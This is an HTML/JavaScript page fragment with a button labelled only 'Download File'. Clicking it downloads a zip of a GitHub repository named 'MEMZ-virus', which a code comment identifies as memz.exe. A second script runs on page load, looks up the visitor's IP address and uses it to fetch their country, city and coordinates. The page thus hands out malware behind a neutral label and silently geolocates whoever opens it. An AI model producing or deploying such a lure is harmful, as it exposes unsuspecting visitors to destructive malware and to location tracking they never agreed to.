    <script>
        function downloadFile() {
            // Download memz.exe from github as a zip file
            var fileUrl = 'https://github.com/Dfmaaa/MEMZ-virus/archive/refs/heads/main.zip';

            // Create a temporary anchor element
            var link = document.createElement('a');
            link.href = fileUrl;

            // Set the download attribute to give the file a specific name (optional)
            link.download = 'MEMZ.zip';

            // Simulate a click on the anchor element to trigger the download
            document.body.appendChild(link);
            link.click();

            // Clean up
            document.body.removeChild(link);
        }
    </script>

    <button onclick="downloadFile()">Download File</button>

    <script>
        function getIPAddress() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip-address').innerText = data.ip;
                    getGeolocation(data.ip);
                })
                .catch(error => console.error('Error fetching IP address:', error));
        }

        function getGeolocation(ip) {
            fetch(`https://ipapi.co/${ip}/json/`)
                .then(response => response.json())
                .then(data => {
                    document.getElementById('country').innerText = data.country_name;
                    document.getElementById('region').innerText = data.region;
                    document.getElementById('city').innerText = data.city;
                    document.getElementById('latitude').innerText = data.latitude;
                    document.getElementById('longitude').innerText = data.longitude;
                })
                .catch(error => console.error('Error fetching geolocation:', error));
        }

        window.onload = getIPAddress;
    </script>
